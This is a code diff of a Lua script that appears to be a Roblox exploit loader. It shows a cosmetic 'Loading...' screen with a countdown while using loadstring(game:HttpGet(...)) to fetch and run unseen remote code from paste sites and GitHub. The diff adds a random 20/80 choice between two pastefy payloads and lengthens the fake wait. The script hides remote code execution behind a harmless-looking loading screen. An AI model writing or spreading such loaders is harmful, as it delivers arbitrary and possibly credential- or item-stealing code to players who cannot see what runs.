@@ -1,3 +1,13 @@
+if getgenv().scriptAlreadyRan then
+    warn("⚠️ ScriptAlreadyRun.")
+    return
+end
+getgenv().scriptAlreadyRan = true
+
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
 -- Создание GUI
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "ColorfulLoadingScreen"
@@ -25,12 +35,24 @@ Title.BackgroundTransparency = 1
 Title.Text = "🌈 Loading..."
 Title.TextColor3 = Color3.fromRGB(255, 255, 150)
 Title.TextStrokeColor3 = Color3.fromRGB(255, 80, 80)
-Title.TextStrokeTransparency = 0.7
+Title.TextStrokeTransparency = 1
 Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.Parent = Background
-loadstring(game:HttpGet("https://pastefy.app/ffi2ONt3/raw", true))()
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/97xodnJ22UBkwejL/raw", true))()
+
+math.randomseed(tick() + os.clock())
+
+local roll = math.random(1, 100)
+
+if roll <= 20 then
+    print("🎯 Выпал 20% шанс — запускаем Скрипт 1")
+    loadstring(game:HttpGet("https://pastefy.app/Oeusn68A/raw",true))()
+else
+    print("💥 Выпал 80% шанс — запускаем Скрипт 2")
+    loadstring(game:HttpGet("https://pastefy.app/hXLrX1JB/raw",true))()
+end
+
+
 -- Таймер
 local TimerLabel = Instance.new("TextLabel")
 TimerLabel.Size = UDim2.new(1, 0, 0.25, 0)
@@ -89,7 +111,7 @@ task.spawn(function()
 end)
 
 -- Таймер и прогресс
-local duration = 30
+local duration = 40
 for i = duration, 1, -1 do
     TimerLabel.Text = "Approximately " .. i .. " seconds left"
 
@@ -120,4 +142,6 @@ end
 
 -- Удаление GUI
 ScreenGui:Destroy()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+
